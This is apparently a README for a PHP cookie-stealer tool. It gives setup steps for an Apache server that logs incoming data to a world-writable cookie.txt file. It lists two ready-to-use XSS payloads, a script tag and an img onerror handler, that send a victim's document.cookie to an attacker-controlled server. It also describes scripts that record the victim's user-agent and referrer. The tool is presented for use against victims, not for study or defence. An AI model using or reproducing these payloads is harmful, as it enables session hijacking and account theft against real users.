# cookie-stealer
simple cookie stealer in PHP

## usage
#### step1 - start web server on your web server
```
sudo apt update && apt upgrade -y
sudo apt install apache2
sudo systemctl start apache2
```

#### step2 
clone the repository in ``` /var/www/html/ ``` directory
and go to the repository directory then give 'cookie.txt' read/write premission.
```
chmod 777 cookie.txt
```

#### step3
now if any cookie or data sent to your webserver by your link, it'll save in the cookie file.
example of a link:
```
http://192.168.1.135/p1.php?txt=your-data
```

#### Payload
here is some payload for vulnerabilities like XSS to steal the cookies of your victim:
```
<script>window.location="http://your-server-ip-or-domain/cookie-stealer/p1.php?txt="+document.cookie</script>
<img src=/ onerror=window.location="http://your-server-ip-or-domain/cookie-stealer/p1.php?txt="+document.cookie></img>
```

### p1.php
p1.php is a basic version of cookie stealer that receives and stores just the value of the txt parameter.

### p2.php
p2.php stores more data from the victim. you can store ``` date user-agent referrer ``` too.


### p3.php
p3.php is used to clear the content of cookie.txt file.
